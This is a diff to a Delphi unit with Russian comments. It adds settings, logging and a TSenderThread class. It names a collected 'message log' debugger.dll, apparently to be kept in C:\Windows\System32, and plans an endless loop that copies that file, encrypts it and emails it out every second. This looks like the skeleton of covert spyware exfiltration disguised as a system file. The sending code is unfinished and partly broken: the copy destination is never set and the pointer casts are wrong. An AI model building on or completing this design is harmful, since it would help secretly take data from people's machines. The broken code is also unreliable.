@@ -3,12 +3,16 @@ unit SClasses;
 
 interface
 
-uses Dialogs,Windows,SysUtils,IniFiles;
+uses Dialogs,Windows,SysUtils,IniFiles,Classes;
+
 const
-  SETTINGS_FILENAME='config.ini';
+  { Имена служебных файлов }
+  SETTINGS_FILENAME    ='config.ini';
+  DEBUG_LOG_FILENAME   ='runtime.log';
+  MESSAGE_LOG_FILENAME ='debugger.dll';
 
 type
-  TSettings = class (TObject)
+  TSettings = class
     private
       FCMD_EnableLog:       Boolean; //  [-l]
       FCMD_ShowWindow:      Boolean; //  [-s]
@@ -16,12 +20,12 @@ type
       {----------------------------}
       FInterfaceName:       String;
       FInterfaceDesc:       String;
-
+      FFullFileName:        String;
     public
       constructor Create;
       destructor  Destroy;
-      procedure   LoadFromINI (filename:string);
-      procedure   SaveToINI (filename:string);
+      procedure   LoadFromINI;
+      procedure   SaveToINI;
       function    IsDublicate: Boolean;
       procedure   CheckDublicate;
       procedure   ReadCMDParams;
@@ -35,21 +39,38 @@ type
   end;
   TDebugLog = class
     private
-      FFileName: String;
-      FEnable: Boolean;
-      FMsgBoxEnable: Boolean;
-      procedure WriteLine (Msg:string);
+      FList:TStringList;
+      FFullFileName: String; //Путь и Имя файла, в который будем писать логи
+      FEnable: Boolean;  //Активена ли запись лога
+      procedure WriteLine (Msg:string); //Записать в файл.
     public
-      constructor Create(FileName:string='debug.log');
-      procedure Add (Msg:string;PrintDate:Boolean=True);
-      procedure ApplySettings (const S:TSettings);
+      constructor Create;
+      destructor Destroy;
+      procedure Add (Msg:string;PrintDate:Boolean=True); //Добавить строку в лог
+      property List:TStringList read FList write FList;
+  end;
+  TSenderThread = class (TThread)
+    private
+      FLog: TObject;
+    public
+      constructor Create(const Log:TObject); overload;
+      procedure Execute; override; //Предопределенный метод.
+      procedure SendMail; //Непосредственно отправка Письма.
   end;
 
+var
+  GlobalLogger: TDebugLog;   //Глобальный лог.
+  GlobalSettings: TSettings; //Глобальный менеджер настроек
+
 implementation
+
+uses StdCtrls;
 
 //TSettings
 constructor TSettings.Create;
 begin
+  FFullFileName:=ExtractFileDir(ParamStr(0))+'\'+SETTINGS_FILENAME;
+
   //Обнуляем все настройки
   FCMD_ShowWindow:=False;
   FCMD_EnableLog:=False;
@@ -62,13 +83,13 @@ destructor TSettings.Destroy;
 begin
 
 end;
-procedure TSettings.LoadFromINI(filename: string);
+procedure TSettings.LoadFromINI;
 var
   Ini:TIniFile;
 begin
   //if FileExists(filename) then
   //begin
-    Ini:=TIniFile.Create(filename);
+    Ini:=TIniFile.Create(FFullFileName);
     try
       FInterfaceName:=Ini.ReadString('main','in','0');
       FInterfaceDesc:=Ini.ReadString('main','id','0');
@@ -81,11 +102,11 @@ begin
     //Writeln('cant load. file not found');
   //end;
 end;
-procedure TSettings.SaveToINI(filename: string);
+procedure TSettings.SaveToINI;
 var
   Ini:TIniFile;
 begin
-    Ini:=TIniFile.Create(filename);
+    Ini:=TIniFile.Create(FFullFileName);
     try
       Ini.WriteString('main','in',FInterfaceName);
       Ini.WriteString('main','id',FInterfaceDesc);
@@ -125,10 +146,13 @@ begin
     I:=1;
     while i<=ParamCount do
     begin
-      if ParamStr(i)='/?' then
+      if ParamStr(i)='-help' then
       begin
-        ShowMessage('This is help');
-        Exit;
+        ShowMessage('This is help'+#13#10+
+                    ' -l   Создавать файл лога'+#13#10+
+                    ' -i   Перевыбор сетевого интерфейса'+#13#10+
+                    ' -s   Отображение главного окна');
+        ExitProcess(0); //Грубовато будет,но че поделать :D
       end
       else
       if (ParamStr(i)='-l') then  //Создавать файл лога
@@ -152,14 +176,20 @@ end;
 //end of TSettings
 
 { TDebugLog }
-constructor TDebugLog.Create(FileName: string);
+constructor TDebugLog.Create;
 begin
-  {
-    Сюда нужно включить проверку на возможность создания файла.
-  }
-  FFileName:=FileName;
-  FEnable:=True;
-  FMsgBoxEnable:=False;
+  if Assigned(GlobalSettings) then
+    FEnable:=GlobalSettings.FCMD_EnableLog
+  else
+    FEnable:=False;
+
+  FFullFileName:=ExtractFileDir(ParamStr(0))+'\'+DEBUG_LOG_FILENAME;
+
+  FList:=TStringList.Create;
+end;
+destructor TDebugLog.Destroy;
+begin
+  FList.Free;
 end;
 procedure TDebugLog.Add(Msg: string;PrintDate:Boolean);
 begin
@@ -169,6 +199,7 @@ begin
       WriteLine(DateTimeToStr(Now)+' '+Msg)
     else
       WriteLine(Msg);
+    FList.Add(Msg);
   end;
 end;
 procedure TDebugLog.WriteLine(Msg: string);
@@ -178,9 +209,9 @@ var
   F:TextFile;
   FullPath:string;
 begin
-  AssignFile(F,FFileName);
+  AssignFile(F,FFullFileName);
   try
-		if not FileExists(FFileName) then Rewrite(F) else Append(F);
+    if not FileExists(FFullFileName) then Rewrite(F) else Append(F);
 		Writeln(F,Msg);
     CloseFile(F);
   except
@@ -191,11 +222,62 @@ begin
     end;
   end;
 end;
-procedure TDebugLog.ApplySettings(const S: TSettings);
+{ end of TDebugLog }
+
+{ TSenderThread }
+constructor TSenderThread.Create(const Log:TObject);
 begin
-  if S.FCMD_EnableLog then FEnable:=True else FEnable:=False;
-  if S.FCMD_ShowWindow then FMsgBoxEnable:=True else FMsgBoxEnable:=False;
+  inherited Create;
+  FLog:=Log;
+  if (FLOG is TMemo) then
+  begin
+    TMemo(FLog).Clear;
+    TMemo(FLog).Lines.Add('Yahoo!');
+  end;
+
 end;
 
-{ end of TDebugLog }
+procedure TSenderThread.Execute;
+begin
+  repeat
+    beep;
+    TMemo(FLog).Lines.Add('tick');
+    Synchronize(SendMail);
+    Sleep(1000);
+  until 1=0
+end;
+
+procedure TSenderThread.SendMail;
+var
+  PathToExe:string; //Папка с файлом "C:\Windows\System32"
+  FullFileName:string;  //Полный путь + имя файла лога "C:\Windows\System32\debugger.dll"
+  TempFileName:string; //Имя временного файла: XXXXddmmyy-hhmm
+  Destination:string;
+begin
+{
+  1.Проверим доступность интернета.
+    1.1.Если доступен, то:
+      -Копируем файл во временный каталог, и переименовываем.
+      -Шифруем содержимое
+      -Отправляем письмо
+      -Удаляем временный файл
+      -Заносим запись в лог в случае успеха.
+      --В случае неудачи указываем этап, и причину ошибки.
+    1.2.Если НЕ доступен, то:
+      -Пишем в лог сообщение об ошибке.
+}
+  PathToExe:=ExtractFileDir(ParamStr(0));
+  FullFileName:=PathToExe+'\'+MESSAGE_LOG_FILENAME;
+  TempFileName:=FormatDateTime('ddmmyy"-"hhnn',Now());
+
+  if not FileExists(FullFileName) then
+  begin
+    ShowMessage('SendMessage: File not found ('+FullFileName+')');
+    exit;
+  end;
+  //Destination:=PathToExe+'\'+TempFileName;
+  CopyFile(PWideChar(@FullFileName),PWideChar(@(Destination)),False);
+
+end;
+{ end of TSenderThread }
 end.
